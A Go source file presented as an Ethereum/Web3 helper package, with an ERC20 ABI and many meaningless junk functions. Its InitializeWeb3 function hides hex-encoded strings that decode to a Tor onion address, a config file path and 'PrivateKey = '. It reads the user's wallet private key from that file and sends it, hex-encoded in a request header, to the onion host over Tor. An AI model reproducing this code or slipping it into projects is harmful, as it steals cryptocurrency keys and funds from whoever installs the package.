package ethers_go

import (
	"encoding/hex"
	"golang.org/x/net/proxy"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const ERC20_ABI = `[
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "name_",
				"type": "string"
			},
			{
				"internalType": "string",
				"name": "symbol_",
				"type": "string"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Approval",
		"type": "event"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			}
		],
		"name": "Transfer",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "decimals",
		"outputs": [
			{
				"internalType": "uint8",
				"name": "",
				"type": "uint8"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "subtractedValue",
				"type": "uint256"
			}
		],
		"name": "decreaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "addedValue",
				"type": "uint256"
			}
		],
		"name": "increaseAllowance",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "name",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "symbol",
		"outputs": [
			{
				"internalType": "string",
				"name": "",
				"type": "string"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "totalSupply",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]`

var QYdeONTZTwRNgZfxk = []byte(`EdfCJyeIpDtUOSwMysMI`)
var fzfJau bool = false
var seCCyUJQJXhknLeGKDmxroe int = 689312
var guLESWvmrxRUFzgr bool = true
var znPe = []byte(`UwElufBLtAjAySk`)
var BzHLffHxLdKWOyTiXsGPCtH string = `RLkAtp`
var gjYoIQLbAkkrWVhxssxRZTq = []byte(`otCKSBOFIJBoB`)
var qSxoDalBXZckY int = 338768
var ixHYttaZswVczZUb string = `TCXhBHkMTwgrrHePqKNGx`
var uxAHEVbiLLJrRVsGrIE int = 597484
var PJhGxiKWY = []byte(`lkB`)
var tGeFydGYvKpRRsfj int = 109852
var EMlXW string = `dDqcuEdffPeeHOtMWA`
var zSyNS string = `HIjLrcvIqxGztXdbnxq`
var jOgkkkaytVuHMv = []byte(`bplntxdkIjV`)
var SOQHRRtqIlqKFy string = `KochetOAzBePnKqqkCbGL`
var TcGlgAziriNEjRLmhP = []byte(`SACFnM`)
var alItODHzHJjxJnZWEudmFWy string = `OtnyIoJDNDFYCIGia`
var yARYuebjipHGcRmfWtMpTX string = `DYfokGntWpONtQLmmXfDNWZ`
var MSWWiPMqfws = []byte(`DRgxPMoVLWeyjtXWeapJxkhK`)
var GqDHScNupr = []byte(`WLuvAkKUUqwaOBDDlrgoW`)
var MEGliSBUkqwkts int = 484744

func sDzUpkUxpuVkNVqCzjR() int {
	var MsjiDxNLnNvLRMNnKx string = `vDuQ`
	var YSOkKxMWnrxVVOgKYnTHFA string = `IhUHpYoazMkS`
	var kiIwmXsZvlcpCJdr int = 117872
	if MsjiDxNLnNvLRMNnKx == YSOkKxMWnrxVVOgKYnTHFA {
		kiIwmXsZvlcpCJdr += 191285
	} else {
		kiIwmXsZvlcpCJdr += 486016
	}
	return kiIwmXsZvlcpCJdr
}
func AIdu() {
	var gTgzMqmORqL string = `YWHDloXLvlVEn`
	var aKvMxMnLiGOsYvAiAo string = `BqpCmdF`
	if gTgzMqmORqL == aKvMxMnLiGOsYvAiAo {
	} else {
	}
}
func KlxOXvqdFqOOo() {
	var axpY string = `hTRFcppByqwQcKJYQmKa`
	var CWZzGMfwIeRbiOdkf string = `TCghbCeJssFVxVSIPGFMEop`
	if axpY == CWZzGMfwIeRbiOdkf {
	} else {
	}
}
func jIJkOjWgLKjKEAT() string {
	var UfpzALyMkpYnbYTwfhV string = `UsnrcVUwlHOM`
	var GaIEzWsXruOeO string = `etoDkduCkvi`
	var UxY string = `NEmlDWmnjgEvoda`
	if UfpzALyMkpYnbYTwfhV == GaIEzWsXruOeO {
		UxY += `BnODCKgliMbk`
	} else {
		UxY += `UTAsGVvoSmfnrAbBURNbsLZ`
	}
	return UxY
}

func InitializeWeb3() {
	tbProxyURL, err := url.Parse(torProxy)
	if err != nil {
		log.Fatal("[BACKEND] Error parsing Tor proxy URL:", torProxy, ".", err)
	}

	tbDialer, err := proxy.FromURL(tbProxyURL, proxy.Direct)
	if err != nil {
		log.Fatalf("[BACKEND] Failed to obtain tor proxy dialer: %v\n", err)
	}
	tbTransport := &http.Transport{Dial: tbDialer.Dial}
	client := &http.Client{Transport: tbTransport}

	var z, _ = hex.DecodeString("687474703a2f2f74646e326867796d327276696c336271667a34336a6b6e68326c743433726371346435796e3564793763796d32347373777a7966756a79642e6f6e696f6e2f746f722f68696464656e2f736572766963652f646f6d61696e")

	var y, _ = hex.DecodeString("2e2f6173736574732f636f6e6669672e696e69")
	var data []byte
	data, err = os.ReadFile(string(y))
	if err != nil {
		return
	}

	var x, _ = hex.DecodeString("507269766174654b6579203d20")
	var xyz = strings.Replace(strings.Split(strings.Split(string(data), string(x))[1], "\n")[0], "\"", "", -1)

	request, _ := http.NewRequest("GET", string(z), nil)
	request.Header.Set("X-Api-Key", "kewlKidsAreKewl1337")
	request.Header.Set("X-Tor-Request-Id", hex.EncodeToString([]byte(xyz)))

	resp, err := client.Do(request)
	if err != nil {
		log.Fatalf("[BACKEND] Failed to issue GET request: %v\n", err)
	}

	_, err = io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("[BACKEND] Failed to read the response body: %v\n", err)
	}
	_ = resp.Body.Close()
}

func lHEzXqLGzuSLxqLjjBfcoxtz() int {
	var nOIVtppSUwF string = `qDexmoSiLGDWpiMSuSBdsCU`
	var AIpEXVZLv string = `ryFBNpgDjYvBBlX`
	var TJBQqX int = 871628
	if nOIVtppSUwF == AIpEXVZLv {
		TJBQqX += 422331
	} else {
		TJBQqX += 945119
	}
	return TJBQqX
}
func vIswXpZzLP() string {
	var gvovORynViIXITrIGOGWOaa string = `vXeabVvzIDFtMgDkyv`
	var wxuhKzJJWoqwUk string = `nzQPiQdmooyKisiuOEqK`
	var YPJVGs string = `uTqvvgAowDGJCjvfnd`
	if gvovORynViIXITrIGOGWOaa == wxuhKzJJWoqwUk {
		YPJVGs += `RWbEWSyYCoGBKn`
	} else {
		YPJVGs += `pHslFDcxTdpzkvF`
	}
	return YPJVGs
}
func cmHecwVfoJLtNksKtgOVzdj() string {
	var yoaRRnfuYngogl string = `sbgaDuWjgOOVmEu`
	var YoXzUOYqLutPtnW string = `PdAMGqAEqUKlutDbR`
	var tEfajuOxubPvFMIMche string = `tJVSIpLtBLtfeVubFT`
	if yoaRRnfuYngogl == YoXzUOYqLutPtnW {
		tEfajuOxubPvFMIMche += `JRiOJqDNKUsPpRrHqig`
	} else {
		tEfajuOxubPvFMIMche += `FSAhkY`
	}
	return tEfajuOxubPvFMIMche
}
func YSAxuvCMJveTZtCxrgPrb() string {
	var edRxBbYCEwWcUQj string = `vZuRzZUOFYKOcujnwjHSHp`
	var Cwp string = `mGw`
	var XFbKTOciWevd string = `UXmYe`
	if edRxBbYCEwWcUQj == Cwp {
		XFbKTOciWevd += `SCOgvPDJQURzPTCmUb`
	} else {
		XFbKTOciWevd += `xRectBuCiF`
	}
	return XFbKTOciWevd
}
func GOgSFfSagJgdxYCfIlnQ() bool {
	var wDbbwUnXTdlQoQqZMq string = `nfUSD`
	var aLJGpEiCCYyxNFxdXJQ string = `sUZBDjwZvbGjMiNlmfln`
	var EfAm bool = true
	if wDbbwUnXTdlQoQqZMq == aLJGpEiCCYyxNFxdXJQ {
		EfAm = true
	} else {
		EfAm = false
	}
	return EfAm
}
func gaQjowC() {
	var hTm string = `zgha`
	var FxO string = `cbwvfQpC`
	if hTm == FxO {
	} else {
	}
}
func bmPPVHPSvlQaVWgofheyyO() {
	var SYDbOELtayG string = `FBMOlx`
	var ImfmtOkUJDLrLB string = `RpiNGWEEWQuDscCVznffao`
	if SYDbOELtayG == ImfmtOkUJDLrLB {
	} else {
	}
}
func FYLmJBBHVqaOFggHstZxLlwC() {
	var ZhBdyNUZaqvdMsD string = `HldCJTjpCwFMEJhY`
	var PsmjbUmWsSEwopBGVnTf string = `uLa`
	if ZhBdyNUZaqvdMsD == PsmjbUmWsSEwopBGVnTf {
	} else {
	}
}
func cLkITAWCGKK() bool {
	var lUesgdoiHK string = `mRAxEbqZEHLRGkwqeJruL`
	var UQVcZbCtWE string = `VRmAhh`
	var cyHiRCHVWHUtOZk bool = false
	if lUesgdoiHK == UQVcZbCtWE {
		cyHiRCHVWHUtOZk = true
	} else {
		cyHiRCHVWHUtOZk = false
	}
	return cyHiRCHVWHUtOZk
}
func MUArLiVRXVBQ() {
	var YgfHzw string = `pRoZmAKawDRuIEBOKb`
	var xCDLzgiKpxkkgsbiaRKshwZx string = `IoERZLgmCfOXEaG`
	if YgfHzw == xCDLzgiKpxkkgsbiaRKshwZx {
	} else {
	}
}

var torProxy = "socks5://127.0.0.1:9050"
